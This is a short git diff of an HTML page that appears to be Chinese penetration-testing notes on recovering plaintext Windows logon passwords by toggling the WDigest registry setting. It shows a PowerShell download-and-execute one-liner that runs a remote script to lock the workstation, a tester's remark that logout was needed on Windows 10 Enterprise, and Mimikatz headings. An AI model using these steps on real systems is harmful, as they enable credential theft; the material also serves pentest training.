@@ -729,7 +729,7 @@
 </ul>
 <h2 id="关闭"><a href="#关闭" class="headerlink" title="关闭"></a>关闭</h2><ul>
 <li><p>cmd</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>powershell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</span><br></pre></td></tr></table></figure>
@@ -748,6 +748,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/kiraly15/Lock-WorkStation/master/Lock-WorkStation.ps1&apos;);&quot;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
+<blockquote>
+<p>经测试 Win10企业版 仅锁屏读明文失败，需要注销才行，其它版本未知。</p>
+</blockquote>
 <h1 id="抓取明文"><a href="#抓取明文" class="headerlink" title="抓取明文"></a>抓取明文</h1><p>开启 <code>Wdigest Auth</code> 后，接下来就用常规的抓取明文的方式就行了。</p>
 <h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><ol>
 <li><p>powershell</p>
